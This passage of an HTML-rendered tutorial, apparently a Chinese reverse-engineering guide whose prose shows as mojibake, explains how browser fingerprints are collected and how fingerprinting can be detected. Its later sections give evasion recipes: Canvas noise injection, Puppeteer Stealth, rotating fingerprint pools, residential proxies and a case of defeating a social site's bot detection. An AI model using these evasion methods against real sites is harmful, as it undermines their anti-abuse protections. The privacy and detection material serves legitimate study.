<span class="w">    </span><span class="nx">colorDepth</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">colorDepth</span><span class="p">,</span>
<span class="w">    </span><span class="nx">pixelDepth</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">pixelDepth</span><span class="p">,</span>
<span class="w">    </span><span class="nx">availWidth</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">availWidth</span><span class="p">,</span>
<span class="w">    </span><span class="nx">availHeight</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">availHeight</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="3-æ—¶åŒºä¸è¯­è¨€">3. æ—¶åŒºä¸è¯­è¨€</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">timezone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Intl</span><span class="p">.</span><span class="nx">DateTimeFormat</span><span class="p">().</span><span class="nx">resolvedOptions</span><span class="p">().</span><span class="nx">timeZone</span><span class="p">;</span><span class="w">  </span><span class="c1">// &quot;Asia/Shanghai&quot;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">language</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">language</span><span class="p">;</span><span class="w">  </span><span class="c1">// &quot;zh-CN&quot;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">languages</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">languages</span><span class="p">;</span><span class="w">  </span><span class="c1">// [&quot;zh-CN&quot;, &quot;zh&quot;, &quot;en&quot;]</span>
</code></pre>
      </div>

      <h3 id="4-æ’ä»¶åˆ—è¡¨">4. æ’ä»¶åˆ—è¡¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">plugins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">plugins</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="c1">// [&quot;Chrome PDF Plugin&quot;, &quot;Chrome PDF Viewer&quot;, ...]</span>
</code></pre>
      </div>

      <p><strong>æ³¨æ„</strong>: ç°ä»£æµè§ˆå™¨å‡ºäºéšç§è€ƒè™‘ï¼Œå·²é™åˆ¶å¯¹æ’ä»¶åˆ—è¡¨çš„è®¿é—®ã€‚</p>

      <h3 id="5-canvas-æŒ‡çº¹">5. Canvas æŒ‡çº¹</h3>

      <p>é€šè¿‡ Canvas æ¸²æŸ“å·®å¼‚ç”ŸæˆæŒ‡çº¹ï¼ˆè¯¦è§ <a href="#04-Advanced-Recipes-canvas-fingerprinting">Canvas æŒ‡çº¹æŠ€æœ¯</a>ï¼‰ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getCanvasFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;canvas&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">textBaseline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;top&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">font</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;14px Arial&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">fillText</span><span class="p">(</span><span class="s1">&#39;fingerprint&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="6-webgl-æŒ‡çº¹">6. WebGL æŒ‡çº¹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getWebGLFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;canvas&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">gl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;webgl&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;experimental-webgl&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">debugInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gl</span><span class="p">.</span><span class="nx">getExtension</span><span class="p">(</span><span class="s1">&#39;WEBGL_debug_renderer_info&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">vendor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gl</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="nx">debugInfo</span><span class="p">.</span><span class="nx">UNMASKED_VENDOR_WEBGL</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">renderer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gl</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="nx">debugInfo</span><span class="p">.</span><span class="nx">UNMASKED_RENDERER_WEBGL</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">vendor</span><span class="p">,</span><span class="w"> </span><span class="nx">renderer</span><span class="w"> </span><span class="p">};</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="7-éŸ³é¢‘æŒ‡çº¹-audiocontext">7. éŸ³é¢‘æŒ‡çº¹ (AudioContext)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getAudioFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">audioContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">AudioContext</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">webkitAudioContext</span><span class="p">)();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">oscillator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">audioContext</span><span class="p">.</span><span class="nx">createOscillator</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">analyser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">audioContext</span><span class="p">.</span><span class="nx">createAnalyser</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">gainNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">audioContext</span><span class="p">.</span><span class="nx">createGain</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">scriptProcessor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">audioContext</span><span class="p">.</span><span class="nx">createScriptProcessor</span><span class="p">(</span><span class="mf">4096</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// é€šè¿‡éŸ³é¢‘å¤„ç†çš„ç»†å¾®å·®å¼‚ç”ŸæˆæŒ‡çº¹</span>
<span class="w">    </span><span class="c1">// ... å¤æ‚çš„éŸ³é¢‘å¤„ç†é€»è¾‘</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="8-å­—ä½“æ£€æµ‹">8. å­—ä½“æ£€æµ‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">detectFonts</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">baseFonts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;monospace&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;sans-serif&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;serif&#39;</span><span class="p">];</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">testFonts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;Arial&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Verdana&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Times New Roman&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Courier&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Comic Sans MS&#39;</span><span class="p">];</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">detectedFonts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="nx">testFonts</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">font</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// é€šè¿‡æµ‹é‡æ–‡æœ¬å®½åº¦çš„å˜åŒ–æ¥æ£€æµ‹å­—ä½“æ˜¯å¦å­˜åœ¨</span>
<span class="w">        </span><span class="c1">// ... å®ç°é€»è¾‘</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">detectedFonts</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="9-ç¡¬ä»¶ä¿¡æ¯">9. ç¡¬ä»¶ä¿¡æ¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">hardwareInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">cpuCores</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">hardwareConcurrency</span><span class="p">,</span><span class="w">  </span><span class="c1">// CPU æ ¸å¿ƒæ•°</span>
<span class="w">    </span><span class="nx">deviceMemory</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">deviceMemory</span><span class="p">,</span><span class="w">  </span><span class="c1">// è®¾å¤‡å†…å­˜ï¼ˆGBï¼‰</span>
<span class="w">    </span><span class="nx">platform</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span><span class="p">,</span><span class="w">  </span><span class="c1">// &quot;Win32&quot;, &quot;MacIntel&quot;</span>
<span class="w">    </span><span class="nx">vendor</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">vendor</span><span class="w">  </span><span class="c1">// &quot;Google Inc.&quot;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æŒ‡çº¹åº“ä½¿ç”¨">æŒ‡çº¹åº“ä½¿ç”¨</h2>

      <h3 id="fingerprintjs">FingerprintJS</h3>

      <p>æœ€æµè¡Œçš„å¼€æºæŒ‡çº¹åº“ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å®‰è£…ï¼šnpm install @fingerprintjs/fingerprintjs</span>

<span class="k">import</span><span class="w"> </span><span class="nx">FingerprintJS</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;@fingerprintjs/fingerprintjs&#39;</span>

<span class="c1">// åˆå§‹åŒ–</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fpPromise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">FingerprintJS</span><span class="p">.</span><span class="nx">load</span><span class="p">();</span>

<span class="c1">// è·å–æŒ‡çº¹</span>
<span class="nx">fpPromise</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">fp</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">fp</span><span class="p">.</span><span class="nx">get</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">result</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Visitor ID:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">visitorId</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Components:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">components</span><span class="p">);</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç‰¹ç‚¹</strong>:</p>

      <ul>
        <li>å‡†ç¡®ç‡é«˜ï¼ˆ99.5%ï¼‰</li>
        <li>æŒä¹…æ€§å¼º</li>
        <li>å¼€æºå…è´¹</li>
      </ul>

      <hr />

      <h2 id="æ£€æµ‹æŒ‡çº¹é‡‡é›†">æ£€æµ‹æŒ‡çº¹é‡‡é›†</h2>

      <h3 id="æ–¹æ³•ä¸€ç›‘æ§-api-è°ƒç”¨">æ–¹æ³•ä¸€ï¼šç›‘æ§ API è°ƒç”¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook Canvas API</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">;</span>
<span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fingerprint] Canvas fingerprinting detected!&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook WebGL</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalGetParameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">WebGLRenderingContext</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">;</span>
<span class="nx">WebGLRenderingContext</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">getParameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">param</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fingerprint] WebGL fingerprinting detected!&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">param</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalGetParameter</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="æ–¹æ³•äºŒæ£€æŸ¥ç¬¬ä¸‰æ–¹è„šæœ¬">æ–¹æ³•äºŒï¼šæ£€æŸ¥ç¬¬ä¸‰æ–¹è„šæœ¬</h3>

      <p>åœ¨ DevTools -> Sources ä¸­æœç´¢å…³é”®è¯ï¼š</p>

      <ul>
        <li><code>fingerprint</code></li>
        <li><code>FingerprintJS</code></li>
        <li><code>canvas.toDataURL</code></li>
        <li><code>WEBGL_debug_renderer_info</code></li>
      </ul>

      <hr />

      <h2 id="åæŒ‡çº¹æŠ€æœ¯">åæŒ‡çº¹æŠ€æœ¯</h2>

      <h3 id="1-ä½¿ç”¨æµè§ˆå™¨æ’ä»¶">1. ä½¿ç”¨æµè§ˆå™¨æ’ä»¶</h3>

      <p><strong>æ¨èæ’ä»¶</strong>:</p>

      <ul>
        <li><strong>Canvas Blocker</strong> (Firefox/Chrome): é˜»æ­¢ Canvas æŒ‡çº¹</li>
        <li><strong>Privacy Badger</strong>: é˜»æ­¢è¿½è¸ªå™¨</li>
        <li><strong>uBlock Origin</strong>: é˜»æ­¢å¹¿å‘Šå’Œè¿½è¸ª</li>
      </ul>

      <h3 id="2-ä¿®æ”¹-user-agent">2. ä¿®æ”¹ User-Agent</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Puppeteer</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">setUserAgent</span><span class="p">(</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&#39;</span><span class="p">);</span>

<span class="c1">// Selenium</span>
<span class="nx">options</span><span class="p">.</span><span class="nx">add_argument</span><span class="p">(</span><span class="s1">&#39;user-agent=Mozilla/5.0...&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="3-ä¼ªé€ -canvaswebgl">3. ä¼ªé€  Canvas/WebGL</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ³¨å…¥å™ªç‚¹åˆ° Canvas</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">;</span>
<span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ·»åŠ éšæœºå™ªç‚¹</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">imageData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">width</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">height</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">imageData</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0.001</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">imageData</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">256</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">putImageData</span><span class="p">(</span><span class="nx">imageData</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="4-ä½¿ç”¨æŒ‡çº¹ä¼ªé€ åº“">4. ä½¿ç”¨æŒ‡çº¹ä¼ªé€ åº“</h3>

      <p><strong>Puppeteer Stealth Plugin</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">StealthPlugin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra-plugin-stealth&#39;</span><span class="p">);</span>

<span class="nx">puppeteer</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">StealthPlugin</span><span class="p">());</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="5-ç»Ÿä¸€ç¯å¢ƒç‰¹å¾">5. ç»Ÿä¸€ç¯å¢ƒç‰¹å¾</h3>

      <p>ç¡®ä¿æ‰€æœ‰è¯·æ±‚ä½¿ç”¨ç›¸åŒçš„ï¼š</p>

      <ul>
        <li>User-Agent</li>
        <li>Screen åˆ†è¾¨ç‡</li>
        <li>æ—¶åŒºå’Œè¯­è¨€</li>
        <li>Canvas/WebGL è¾“å‡º</li>
      </ul>

      <hr />

      <h2 id="ç»•è¿‡ç­–ç•¥">ç»•è¿‡ç­–ç•¥</h2>

      <h3 id="ç­–ç•¥ä¸€ä½¿ç”¨çœŸå®æµè§ˆå™¨">ç­–ç•¥ä¸€ï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨</h3>

      <p>Puppeteer/Playwright æ§åˆ¶çœŸå®æµè§ˆå™¨ï¼Œå¤©ç„¶å…·æœ‰å®Œæ•´æŒ‡çº¹ã€‚</p>

      <h3 id="ç­–ç•¥äºŒæŒ‡çº¹æ± ">ç­–ç•¥äºŒï¼šæŒ‡çº¹æ± </h3>

      <p>ç»´æŠ¤å¤šä¸ªä¸åŒçš„æŒ‡çº¹é…ç½®ï¼Œè½®æ¢ä½¿ç”¨ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">FINGERPRINT_POOL</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
        <span class="s1">&#39;user_agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0&#39;</span><span class="p">,</span>
        <span class="s1">&#39;screen&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">},</span>
        <span class="s1">&#39;timezone&#39;</span><span class="p">:</span> <span class="s1">&#39;America/New_York&#39;</span><span class="p">,</span>
        <span class="s1">&#39;language&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US&#39;</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="s1">&#39;user_agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ...&#39;</span><span class="p">,</span>
        <span class="s1">&#39;screen&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1440</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">900</span><span class="p">},</span>
        <span class="s1">&#39;timezone&#39;</span><span class="p">:</span> <span class="s1">&#39;America/Los_Angeles&#39;</span><span class="p">,</span>
        <span class="s1">&#39;language&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US&#39;</span>
    <span class="p">}</span>
<span class="p">]</span>

<span class="c1"># éšæœºé€‰æ‹©ä¸€ä¸ªæŒ‡çº¹</span>
<span class="n">fingerprint</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">FINGERPRINT_POOL</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ç­–ç•¥ä¸‰ä½å®…ä»£ç†">ç­–ç•¥ä¸‰ï¼šä½å®…ä»£ç†</h3>

      <p>é«˜è´¨é‡ä½å®…ä»£ç†é€šå¸¸è‡ªå¸¦çœŸå®ç”¨æˆ·çš„å®Œæ•´æŒ‡çº¹ã€‚</p>

      <hr />

      <h2 id="æµ‹è¯•å·¥å…·">æµ‹è¯•å·¥å…·</h2>

      <h3 id="åœ¨çº¿æµ‹è¯•">åœ¨çº¿æµ‹è¯•</h3>

      <ul>
        <li><a href="https://amiunique.org/">AmIUnique</a> - æŒ‡çº¹å”¯ä¸€æ€§æµ‹è¯•</li>
        <li><a href="https://browserleaks.com/">BrowserLeaks</a> - å…¨é¢çš„æµè§ˆå™¨ä¿¡æ¯æ³„éœ²æ£€æµ‹</li>
        <li><a href="https://coveryourtracks.eff.org/">Cover Your Tracks</a> - EFF çš„éšç§æµ‹è¯•</li>
        <li><a href="https://fingerprint.com/demo/">Fingerprint.com Demo</a> - FingerprintJS æ¼”ç¤º</li>
      </ul>

      <h3 id="å‘½ä»¤è¡Œæµ‹è¯•">å‘½ä»¤è¡Œæµ‹è¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ curl æµ‹è¯• TLS æŒ‡çº¹</span>
curl<span class="w"> </span>--user-agent<span class="w"> </span><span class="s2">&quot;Mozilla/5.0...&quot;</span><span class="w"> </span>https://tls.peet.ws/api/clean
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹æŸç¤¾äº¤ç½‘ç«™æ£€æµ‹">æ¡ˆä¾‹ï¼šæŸç¤¾äº¤ç½‘ç«™æ£€æµ‹</h3>

      <p><strong>ç°è±¡</strong>: Python requests è®¿é—®è¿”å›ç©ºæ•°æ®ï¼Œæµè§ˆå™¨æ­£å¸¸ã€‚</p>

      <p><strong>åˆ†ææ­¥éª¤</strong>:</p>

      <ol>
        <li>å¯¹æ¯”è¯·æ±‚å¤´ - å·²ä¼ªé€ ï¼Œä»å¤±è´¥</li>
        <li>æ£€æŸ¥ Cookie - å·²æºå¸¦ï¼Œä»å¤±è´¥</li>
        <li>æ€€ç–‘æŒ‡çº¹æ£€æµ‹</li>
      </ol>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.chrome.options</span><span class="w"> </span><span class="kn">import</span> <span class="n">Options</span>

<span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
